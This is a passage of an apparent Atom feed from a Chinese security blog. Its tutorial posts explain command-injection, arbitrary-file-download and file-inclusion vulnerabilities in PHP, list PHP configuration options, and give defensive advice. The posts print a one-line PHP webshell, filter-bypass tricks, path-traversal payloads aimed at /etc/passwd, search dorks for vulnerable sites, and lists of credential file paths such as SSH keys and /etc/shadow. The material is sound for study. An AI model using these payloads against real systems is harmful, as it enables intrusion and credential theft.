    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="RCE" scheme="https://sinevil.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://sinevil.github.io/2021/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://sinevil.github.io/2021/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-07-23T07:46:24.000Z</published>
    <updated>2021-08-08T09:03:05.434Z</updated>
    
    <content type="html"><![CDATA[<p><strong>命令执行漏洞</strong></p><ul><li>什么是命令执行漏洞</li></ul><p>应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞</p><ul><li>漏洞产生的原因</li></ul><p>(1):代码过滤不严或者无过滤。(没有过滤&amp;、&amp;&amp;、|、||等连接符)<br>(2):系统漏洞造成的命令执行，bash破壳漏洞，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等。<br>(3):调用第三方组件，如php(system()、shell_exec()、exec()、eval())，java(struct2)，thinkphp(thinkphp是一个老牌的php)(比如一句话木马<?php @eval($_GET[cmd]); ?>)</p><ul><li>漏洞分类</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码层过滤不严</span></span><br><span class="line">商业应用的一些核心代码封装在二进制文件中 ,在web应用中通过system函数来调用:</span><br><span class="line">system(<span class="string">&quot;/bin/program - arg <span class="variable">$arg</span>&quot;</span>);</span><br><span class="line"><span class="comment">#系统的漏洞造成命令注入</span></span><br><span class="line">bash破壳漏洞(CVE.2014-6271)</span><br><span class="line"><span class="comment">#调用的第三方组件存在命令执行漏洞</span></span><br><span class="line">如WordPress中用来处理图片的ImageMagick组件，JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)，ThinkPHP命令执行</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><p>反弹shell</p><p>执行系统命令，读写文档</p><p>控制网站甚至服务器</p><p>进一步的内网渗透</p><ul><li>常用管道符</li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows</span></span><br><span class="line"><span class="string">&quot;|&quot;</span>:无论前面的命令是否执行成功，直接执行后面的命令(并且只执行后面的命令，不显示前面的命令执行结果)。</span><br><span class="line"><span class="string">&quot;||&quot;</span>:如果前面的命令执行成功，则不执行后面的命令；如果前面的命令执行失败，则会执行后面的命令。</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>:如果前面的命令执行成功，则会接着去执行后面的语句；如果前面的语句执行失败，还会执行后面的语句。</span><br><span class="line"><span class="string">&quot;&amp;&amp;&quot;</span>:如果前面的命令执行成功，后面的命令也会执行；如果前面的命令执行失败，则会直接报错。</span><br><span class="line"><span class="comment">#Linux</span></span><br><span class="line"><span class="string">&quot;;&quot;</span>:执行完前面的命令再执行后面的命令。如果前面的命令执行成功，后面的命令也会执行；如果前面的命令执行失败，则会执行后面的命令。</span><br><span class="line"><span class="string">&quot;|&quot;</span>:无论前面的命令是否执行成功，直接执行后面的命令(并且只执行后面的命令，不显示前面的命令执行结果)。</span><br><span class="line"><span class="string">&quot;||&quot;</span>:如果前面的命令执行成功，则不执行后面的命令；如果前面的命令执行失败，则会执行后面的命令。</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>:如果前面的命令执行成功，则会接着去执行后面的语句；如果前面的语句执行失败，还会执行后面的语句。</span><br><span class="line"><span class="string">&quot;&amp;&amp;&quot;</span>:如果前面的命令执行成功，后面的命令也会执行；如果前面的命令执行失败，则会直接报错</span><br></pre></td></tr></table></figure><ul><li>常用指令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows</span></span><br><span class="line">dir----查看文件目录</span><br><span class="line">ipconfig----查看Windows的IP地址</span><br><span class="line">arp -a----查看ARP缓存表</span><br><span class="line">calc----在命令行打开计算器</span><br><span class="line">regedit----打开注册表</span><br><span class="line">netstat -ano----查看开放的端口信息</span><br><span class="line"><span class="comment">#Linux</span></span><br><span class="line">cat /etc/passwd----查看passwd文件</span><br><span class="line">id----查看该用户的ID号</span><br><span class="line">groups----查看用户所属的组</span><br><span class="line">cat /etc/group----查看组信息</span><br><span class="line">whoami----查看当前用户</span><br><span class="line"><span class="built_in">pwd</span>----查看当前路径</span><br><span class="line">uname -a----查看主机信息</span><br><span class="line">cat /etc/issue----查看主机的配置信息</span><br><span class="line">netstat -pantu----查看开放的端口信息</span><br><span class="line">netstat -nr----查看路由信息</span><br></pre></td></tr></table></figure><ul><li>绕过技巧</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat的绕过</span></span><br><span class="line">cat 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过分隔符</span></span><br><span class="line">绕过分隔符: %0a换行符 %0d回车符 以及;(连续指令) &amp; | || &amp;&amp;</span><br><span class="line">在 shell 中，担任”连续指令”功能的符号就是”分号”</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过空格</span></span><br><span class="line">&lt; &lt;&gt;  <span class="variable">$&#123;IFS&#125;</span> $IFS<span class="variable">$9</span> </span><br><span class="line"><span class="variable">$IFS</span>在linux下表示分隔符，单纯的cat<span class="variable">$IFS</span>,bash解释器会把整个IFS当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用<span class="variable">$9</span>呢，因为<span class="variable">$9</span>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过黑名单单词：</span></span><br><span class="line"><span class="string">&#x27;  &#x27;</span><span class="string">&#x27; \ *(补全符) 以及通过base64转码绕过</span></span><br></pre></td></tr></table></figure><ul><li>防范方法</li></ul><p>尽量少使用或禁用system，eval等执行命令的函数</p><p>在执行命令函数之前，对参数进行过滤，对敏感字符进行转义</p><p>参数值尽量用引号包括</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;命令执行漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是命令执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_po</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="RCE" scheme="https://sinevil.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>PHP常用配置</title>
    <link href="https://sinevil.github.io/2021/07/22/php%E9%85%8D%E7%BD%AE/"/>
    <id>https://sinevil.github.io/2021/07/22/php%E9%85%8D%E7%BD%AE/</id>
    <published>2021-07-22T01:46:55.000Z</published>
    <updated>2021-08-13T02:50:15.676Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">语言相关配置</span><br><span class="line">engine  <span class="comment">#设置php引擎是否可用，默认值On</span></span><br><span class="line">short_open_tag  <span class="comment">#是否允许php脚本使用短开放标记，将&quot;&lt;?php ?&gt;&quot;改为&quot;&lt;? ?&gt;&quot;这个语法与XML相同，在某些情况下可能会导致问题，所以一般建议关闭</span></span><br><span class="line">asp_tags  <span class="comment">#是否支持ASP风格的脚本定界 &quot;&lt;% %&gt;&quot;</span></span><br><span class="line">precision  <span class="comment">#指定在浮点数表示中显示的有效数字，该项在win32系统中设置为14，linux中设置为12</span></span><br><span class="line">output_buffering  <span class="comment">#设置是否使用输出缓冲，或者设置输出缓冲区的大小。使用输出缓冲会使性能稍稍下降(output_buffering = &#x27;number&#x27;,output_buffering = On)</span></span><br><span class="line">output_handler  <span class="comment">#设置将输出返回给请求用户之前要把所有输出传输给一个函数。例如，假如你希望返回给浏览器之前先对所有输出进行压缩，可以将该项配置为PHP的压缩处理函数“ob_gzhsndler”</span></span><br><span class="line">zlib.output_compression  <span class="comment">#通过设置决定是否在输出返回浏览器之前先自动压缩，通过赋一个整数值，可以启用输出压缩，同时设置压缩缓冲罐区大小</span></span><br><span class="line">zlib.output_handler  <span class="comment">#如果zilb库不可用，该配置将指定一个特定的压缩库</span></span><br><span class="line">implicit_flush  <span class="comment">#启动时，每次调用print()或者echo()，以及完成各个嵌入的HTML块后，将自动清楚或刷新其内容的输出缓冲区，当服务器需要非常长的时间来编译结果或完成某些计算时，这可能很有用，在这些情况下，可以利用这个特征向用户输出状态更新，而不是等待服务器完成整个过程后才输出</span></span><br><span class="line">ignore_user_abort  <span class="comment">#是否设置即使在用户中止请求后也坚持完成整个请求，在执行一个长请求的时候应当考虑打开它，因为长请求可能会导致用户中途中止或浏览器超时，该配置项可以用于实现类似Unix的crontab(定时任务计划)功能</span></span><br><span class="line">zend.enable_gc  <span class="comment">#设置是否开启PHP的垃圾回收机制</span></span><br><span class="line">安全相关配置</span><br><span class="line">safe_mode</span><br><span class="line">safe_mode_gid</span><br><span class="line">safe_mode_include_dir</span><br><span class="line">safe_mode_exec_dir</span><br><span class="line">safe_mode_protected_env_vars</span><br><span class="line">open_basedir</span><br><span class="line">disable_functions</span><br><span class="line">disable_classes</span><br><span class="line">allow_url_include</span><br><span class="line">allow_url_fopen</span><br><span class="line">register_globals</span><br><span class="line">enable_dll</span><br><span class="line">cgi.force_redirect</span><br><span class="line">性能相关配置</span><br><span class="line">realpath_cache_size</span><br><span class="line">realpath_cache_ttl</span><br><span class="line">auto_globals_jit</span><br><span class="line">错误信息相关配置</span><br><span class="line">log_errors</span><br><span class="line">error_log</span><br><span class="line">error_reporting</span><br><span class="line">E_ALL</span><br><span class="line">E_ERROR</span><br><span class="line">E_WARNING</span><br><span class="line">E_PARSE</span><br><span class="line">E_NOTICE</span><br><span class="line">E_STRICT</span><br><span class="line">E_CORE_ERROR</span><br><span class="line">E_COMPILE_WARRING</span><br><span class="line">E_USER_ERROR</span><br><span class="line">E_USER_WARNING</span><br><span class="line">E_USER_NOTICE</span><br><span class="line">display_errors</span><br><span class="line">display_startup_errors</span><br><span class="line">track_errors</span><br><span class="line">log_errors_max_len</span><br><span class="line">ignore_repeated_errors</span><br><span class="line">ignore_repeated_source</span><br><span class="line">report_memleaks</span><br><span class="line">error_prepend_string</span><br><span class="line">error_append_string</span><br><span class="line">资源相关配置</span><br><span class="line">max_execution_time</span><br><span class="line">memory_execution_time</span><br><span class="line">max_input_nesting_level</span><br><span class="line">max_input_vars</span><br><span class="line">max_input_time</span><br><span class="line">default_socket_timeout</span><br><span class="line">pcre.backtrack_limit</span><br><span class="line">pcre.recursion_limit</span><br><span class="line">post_max_size</span><br><span class="line">数据处理相关配置</span><br><span class="line">allow_calltime_pass_reference</span><br><span class="line">register_argc_argv</span><br><span class="line">request_order</span><br><span class="line">variables_order</span><br><span class="line">arg_separator.output</span><br><span class="line">arg_separator.input</span><br><span class="line">auto_prepend_file和auto_append_file</span><br><span class="line">default_mimetype和default_charset</span><br><span class="line">文件上传相关配置</span><br><span class="line">file_uploads</span><br><span class="line">max_file_uploads</span><br><span class="line">upload_tmp_dir</span><br><span class="line">upload_max_filesize</span><br><span class="line">Session相关配置</span><br><span class="line">session.save_path</span><br><span class="line">session.save_handler</span><br><span class="line">session.use_cookies</span><br><span class="line">session.use_only_cookies</span><br><span class="line">session,name</span><br><span class="line">session,auto_start</span><br><span class="line">session.cookie_lifetime</span><br><span class="line">session.gc_probability和session.gc_divisor</span><br><span class="line">session.gc_maxlifetime</span><br><span class="line">session_trans_sid</span><br><span class="line">seaasion.bug_compat_42和session.bug_warn</span><br><span class="line">session.hash_bits_per_character</span><br><span class="line">url_rewrite.tags</span><br><span class="line">其他配置</span><br><span class="line">extension_dir</span><br><span class="line">extension</span><br><span class="line">date.timezone</span><br><span class="line">doc_root</span><br><span class="line">magic_quotes_gpc</span><br><span class="line">expose_php</span><br><span class="line">user_ini.filenmae和user_cache-ttl</span><br><span class="line">include_path</span><br><span class="line">sys_temp_dir</span><br><span class="line">cgi.nph</span><br><span class="line">SMTP</span><br><span class="line">smtp_port</span><br><span class="line">cgi.force_redirect</span><br><span class="line">cgi.fix_redirect</span><br><span class="line">cgi.fix_pathinfo</span><br><span class="line">Fastcgi.impersonate</span><br><span class="line">Fastcgi.impersonate</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="相关配置" scheme="https://sinevil.github.io/categories/%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="php" scheme="https://sinevil.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>任意文件下载漏洞</title>
    <link href="https://sinevil.github.io/2021/07/21/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://sinevil.github.io/2021/07/21/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-21T09:03:47.000Z</published>
    <updated>2021-08-08T09:51:31.752Z</updated>
    
    <content type="html"><![CDATA[<p><strong>任意文件下载漏洞</strong></p><ul><li>什么是任意文件下载漏洞</li></ul><p>由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击</p><ul><li>利用条件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存在读文件的函数</span><br><span class="line">读取文件的路径用户可控且未校验或校验不严</span><br><span class="line">输出了文件内容</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><p>通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等</p><ul><li>敏感信息路径</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows：</span></span><br><span class="line">   C:\boot.ini  //查看系统版本</span><br><span class="line">   C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件</span><br><span class="line">   C:\Windows\repair\sam  //存储系统初次安装的密码</span><br><span class="line">   C:\Program Files\mysql\my.ini  //Mysql配置</span><br><span class="line">   C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root</span><br><span class="line">   C:\Windows\php.ini  //php配置信息</span><br><span class="line">   C:\Windows\my.ini  //Mysql配置信息</span><br><span class="line">   ...</span><br><span class="line"><span class="comment">#Linux：</span></span><br><span class="line">   /root/.ssh/authorized_keys</span><br><span class="line">   /root/.ssh/id_rsa</span><br><span class="line">   /root/.ssh/id_ras.keystore</span><br><span class="line">   /root/.ssh/known_hosts</span><br><span class="line">   /etc/passwd</span><br><span class="line">   /etc/shadow</span><br><span class="line">   /etc/my.cnf</span><br><span class="line">   /etc/httpd/conf/httpd.conf</span><br><span class="line">   /root/.bash_history</span><br><span class="line">   /root/.mysql_history</span><br><span class="line">   /proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">   /proc/mounts</span><br><span class="line">   /porc/config.gz</span><br></pre></td></tr></table></figure><ul><li>漏洞代码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#任意文件读取</span></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    readfile(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>) or die(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = fread(<span class="variable">$fp</span>,filesize(<span class="variable">$filename</span>));</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$data</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#任意文件下载</span></span><br><span class="line">&lt;a href=<span class="string">&quot;http://www.xx.com/a.zip&quot;</span>&gt;Download&lt;/a&gt;</span><br><span class="line"><span class="comment">#header()下载</span></span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;uploads/201607141437284653.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: imgage/jpeg&#x27;</span>);</span><br><span class="line">    header(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">    header(<span class="string">&#x27;Content-Lengh: &#x27;</span>.filesize(<span class="variable">$filename</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>漏洞利用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#url</span></span><br><span class="line">readfile.php?file=/etc/passwd</span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd</span><br><span class="line">readfile.php?file=../../../../../../../../etc/passwd%00</span><br><span class="line"><span class="comment">#google语法</span></span><br><span class="line">inurl:<span class="string">&quot;readfile.php?file=&quot;</span></span><br><span class="line">inurl:<span class="string">&quot;read.php?filename=&quot;</span></span><br><span class="line">inurl:<span class="string">&quot;download.php?file=&quot;</span></span><br><span class="line">inurl:<span class="string">&quot;down.php?file=&quot;</span></span><br></pre></td></tr></table></figure><ul><li>防范方法</li></ul><p>过滤<code>.</code>，使用户不能再url上回溯上级目录</p><p>正则判断用户输入参数的格式</p><p>php.ini配置open_basedir限定文件允许访问范围</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;任意文件下载漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是任意文件下载漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="php漏洞" scheme="https://sinevil.github.io/tags/php%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://sinevil.github.io/2021/07/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://sinevil.github.io/2021/07/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-07-20T06:42:33.000Z</published>
    <updated>2021-08-08T10:54:16.067Z</updated>
    
    <content type="html"><![CDATA[<p><strong>文件包含漏洞</strong></p><ul><li>原理</li></ul><p>服务器执行代码时，可以通过文件包含函数加载另一个文件的代码，当被包含文件的代码中存在恶意代码时，也会将其解析并且执行，且该漏洞不只是出现在php语言中，还有其他语言，例如，jsp，asp。</p><ul><li>漏洞产生原因</li></ul><p>没有对文件包含的参数进行过滤或者严格的定义，并且参数可以被用户控制</p><ul><li>危害</li></ul><p>服务器的网页被篡改，网站被挂马，服务器被远端控制，被安装后门</p><ul><li>php中的常见函数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include  <span class="comment">#包含并且运行指定文件，include在出错时产生警告(E_WARNING)，脚本会继续运行</span></span><br><span class="line">include_once  <span class="comment">#在脚本执行期间包含并运行指定文件。该函数和include函数类似，两者唯一的区别是使用该函数时，php会检查指定文件是否已经被包含过，如果是，则不会再次包含</span></span><br><span class="line">require  <span class="comment">#包含并且运行指定文件，require在出错时产生E_COMPILE_ERROR级别的错误，导致脚本中止运行</span></span><br><span class="line">require_once  <span class="comment">#类似于include_once的require</span></span><br></pre></td></tr></table></figure><p><strong>本地文件包含漏洞</strong></p><ul><li>无限制本地文件包含</li></ul><p>无限制本地文件包含漏洞是指代码中没有为包含文件指定特定的前缀或者扩展名，因此攻击者可以利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，或者执行其他文件中的代码</p><ul><li>常见的敏感信息路径</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Windows系统常见敏感文件</span><br><span class="line">C: \boot.ini          <span class="comment">#系统版本信息</span></span><br><span class="line">C: \xxx\php.ini       <span class="comment">#PHP配置信息</span></span><br><span class="line">C: \xxx\my.ini        <span class="comment">#MySQL配置信息</span></span><br><span class="line">C: \xxx\httpd.conf    <span class="comment">#Apache配置信息</span></span><br><span class="line">Linux系统常见敏感文件</span><br><span class="line">/etc/passwd                  <span class="comment">#Linux系统账号信息</span></span><br><span class="line">/etc/httpd/conf/httpd,conf   <span class="comment">#Apache配置信息</span></span><br><span class="line">/etc/my.conf                 <span class="comment">#MySQL配置信息</span></span><br><span class="line">/usr/etx/php.ini             <span class="comment">#PHP配置信息</span></span><br></pre></td></tr></table></figure><ul><li> 漏洞利用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞代码示例：</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$GET_</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;  </span><br><span class="line"><span class="comment">#读取文件内容：</span></span><br><span class="line">目录遍历后获取路径，获取的系统中文件内容</span><br><span class="line">htt://www. . /xxx.php?filename=../../../../../../../路径</span><br><span class="line"><span class="comment">#利用无限制本地文件包含漏洞，可以通过文件包含功能执行任意扩展名的文件中的代码</span></span><br><span class="line">http://路径/xxx.php?filename=文件</span><br></pre></td></tr></table></figure><ul><li>有限制本地文件包含</li></ul><p>有限制本地文件上传包含漏洞是指代码中为包含文件指定了特定的前缀或者<code>.php .html</code>等扩展名，攻击者需要绕过前缀或者扩展名过滤，才能利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，常见的有限制本地文件包含过滤绕过的方式主要有%00截断，路径长度截断，点号截断文件包含这三种</p><ul><li>%00截断文件包含</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 